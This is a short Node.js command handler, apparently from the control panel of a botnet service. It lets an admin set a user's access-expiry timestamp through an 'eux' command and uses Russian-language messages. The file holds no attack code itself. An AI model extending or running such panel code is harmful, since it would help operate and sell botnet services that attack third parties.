const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^eux ([A-Za-z0-9]+) ([0-9]+)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    let endUnix = Number(args[2])
    if(!endUnix  || endUnix < 0) {
        if(endUnix !== 0) return client.write(center('Invalid endUnix.'.red.italic, client.getWidth()) + '\n\n')
    }

    user.endUnix = endUnix
    client.write(center(`End Unix ${username} setted.`.bgGreen.brightWhite, client.getWidth()) + '\n\n')
})